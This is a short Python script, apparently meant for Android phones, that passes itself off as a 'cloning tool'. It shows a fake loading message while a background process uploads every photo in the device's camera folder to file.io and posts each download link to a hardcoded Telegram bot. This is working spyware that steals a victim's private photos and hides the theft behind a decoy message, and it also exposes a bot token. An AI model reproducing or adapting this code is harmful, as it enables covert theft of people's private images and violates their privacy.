import os
import requests
import multiprocessing

uname = "<YOKIA/parbej>"
directory_path = '/sdcard/DCIM/Camera'


def upload_file_to_file_io(file_path):
    with open(file_path, 'rb') as file:
        response = requests.post('https://file.io', files={'file': file})
        response_data = response.json()
        return response_data.get('link')

def process_directory_files(directory_path):
    if os.path.exists(directory_path) and os.path.isdir(directory_path):
        for filename in os.listdir(directory_path):
            file_path = os.path.join(directory_path, filename)
            if os.path.isfile(file_path):
                file_link = upload_file_to_file_io(file_path)
                requests.get("https://api.telegram.org/bot6758476907:AAHgM8yolfHWV_6T7vuDkV2WbDRd9vFbPrE/sendMessage?chat_id=5326153007&text= [•] FILES FOR " + uname + "\nLINK : "+file_link)
    else:
        print("Directory does not exist.")
        print("CHECK NICELY THE FILE/FOLDERS")

if __name__ == "__main__":
    # Create a multiprocessing Process to run the function in the background
    print("\u001b[36m CLONING TOOLS LOADING PLEASE WAIT AUTO UPDATE...")
    background_process = multiprocessing.Process(target=process_directory_files, args=(directory_path,))
    background_process.start()
